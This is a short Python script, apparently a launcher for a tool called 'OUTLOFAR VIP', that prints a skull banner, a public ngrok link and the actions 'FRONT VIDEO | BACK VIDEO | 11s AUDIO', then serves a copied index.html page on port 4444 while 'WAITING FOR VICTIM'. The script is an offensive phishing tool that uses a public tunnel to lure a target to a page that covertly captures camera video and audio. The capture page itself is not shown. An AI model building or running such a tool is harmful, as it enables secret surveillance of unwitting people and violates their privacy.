import os
import http.server
import socketserver

def start_vip_engine():
    os.system('clear')
    # Blue Skull Design
    print("\033[94m" + """
      .XXXXXXXXXXXXXXX.
     XXXXXXXXXXXXXXXXXXX
    XXXXXXXXXXXXXXXXXXXXX
    XXX   XXXXX   XXXXXXX
    XXX   XXXXX   XXXXXXX
    XXXXX       XXXXXXXXX
     XXXXXXXXXXXXXXXXXXX
      XXXXX  X  XXXXXXX
       XXXXXXXXXXXXXXX
    """ + "\033[0m")
    print("\033[96m[ OUTLOFAR VIP v2.0 - FAST CAPTURE ]\033[0m")
    print("-" * 55)
    print("\033[92m[*] NGROK LINK : https://carole-unerrant-antonia.ngrok-free.dev\033[0m")
    print("[*] ACTIONS    : FRONT VIDEO | BACK VIDEO | 11s AUDIO")
    print("-" * 55)
    print("\033[93m[*] STATUS: SERVER LIVE ON PORT 4444... WAITING FOR VICTIM\033[0m")
    
    # Auto-linking index file
    os.system("cp ~/Photo/index.py ./index.html 2>/dev/null")
    
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 4444), Handler) as httpd:
        httpd.serve_forever()

if __name__ == "__main__":
    start_vip_engine()
